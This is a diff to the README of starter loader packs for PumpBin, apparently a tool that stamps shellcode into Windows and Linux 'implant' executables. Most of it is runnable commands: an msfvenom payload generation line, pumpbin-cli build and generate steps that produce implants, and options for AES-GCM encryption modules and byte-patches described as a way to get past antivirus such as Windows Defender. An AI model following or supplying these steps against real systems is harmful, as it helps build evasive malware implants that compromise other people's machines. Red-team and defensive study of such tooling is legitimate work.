@@ -1,7 +1,6 @@
 # Starter plugins
 
-Two ready-to-use `.b1n` loader packs to get a new PumpBin user from
-zero to a working implant in 30 seconds.
+Two ready-to-use `.b1n` loader packs for trying PumpBin with your own shellcode.
 
 | File         | Target              | Loader technique                              | Size   |
 |--------------|---------------------|-----------------------------------------------|--------|
@@ -13,84 +12,41 @@ simple — meant for smoke-testing the build pipeline and learning how
 PumpBin stamps a `.b1n` against a shellcode, not for operational use
 against modern EDR.
 
-## 30-second smoke test (Windows)
+## Windows
 
 ```bash
-# 1. Generate any shellcode you have lying around.
+# 1. Prepare a Windows x64 shellcode file.
 msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin
 
-# 2. Write a 10-line profile.
-cat > pumpbin.toml <<'EOF'
-schema = "pumpbin.profile/v1"
+# 2. Generate.
+pumpbin-cli generate --pack examples/starter-plugins/windows.b1n --shellcode payload.bin -o out/implant.exe
 
-[pack]
-source = "examples/starter-plugins/windows.b1n"
-
-[target]
-platform = "windows"
-binary_type = "exe"
-
-[shellcode]
-source = "file"
-path = "payload.bin"
-
-[output]
-path = "out/implant.exe"
-sbom = true
-EOF
-
-# 3. Build.
-pumpbin-cli build -f pumpbin.toml
-
-# 4. Ship to a Windows box and run. (Defender will eat this — see
-#    "expected detection" below.)
+# 3. Move it to a Windows host and run it. See "expected detection" below.
 ```
 
-## 30-second smoke test (Linux)
+## Linux
 
 ```bash
-# Tiny sentinel shellcode that writes "PB-QA-OK" to a file then exits.
-# Real operators use msfvenom/sliver/donut output here.
-cp tests/fixtures/qa/linux_sentinel.bin payload.bin
-
-cat > pumpbin.toml <<'EOF'
-schema = "pumpbin.profile/v1"
-[pack]
-source = "examples/starter-plugins/linux.b1n"
-[target]
-platform = "linux"
-binary_type = "exe"
-[shellcode]
-source = "file"
-path = "payload.bin"
-[output]
-path = "out/implant"
-EOF
-
-pumpbin-cli build -f pumpbin.toml
+# Put any Linux x64 shellcode at payload.bin.
+pumpbin-cli generate --pack examples/starter-plugins/linux.b1n --shellcode payload.bin -o out/implant
 chmod +x out/implant
 ./out/implant && echo "ran cleanly"
 ```
 
 ## Expected detection
 
-These starter plugins are intentionally naïve. The Windows one in
-particular will be quarantined by Windows Defender within seconds of
-landing on disk for any common payload (Cobalt Strike beacon,
-msfvenom, etc.).
+These starter plugins are simple examples. The Windows one will be quarantined by Windows Defender for common payloads.
 
-To ship something that survives basic AV, compose an encryption
-module into the build:
+To add encryption, bake an encrypt module into a loader pack:
 
 ```bash
-pumpbin-cli stamp loader.exe payload.bin --encrypt-module aes-gcm
+pumpbin-cli create-b1n --template loader.exe --output loader.b1n --encrypt-module aes-gcm
 ```
 
-Or apply a post-build byte-patch in the same command:
+Or apply a post-build byte-patch during generation:
 
 ```bash
-pumpbin-cli stamp loader.exe payload.bin \
-    --encrypt-module aes-gcm \
+pumpbin-cli generate --pack loader.b1n --shellcode payload.bin \
     --post byte-patch:patches=4831d2:4833d2
 ```
 
@@ -102,8 +58,6 @@ If you change the loader source and want to refresh the `.b1n`:
 
 **Linux:**
 ```
-# linux.b1n is a copy of tests/fixtures/qa/linux_loader.b1n,
-# itself a re-package of test/linux_loader_basic.b1n. To build fresh:
 pumpbin-cli create-b1n \
     --output examples/starter-plugins/linux.b1n \
     --template <your-linux-loader-elf>
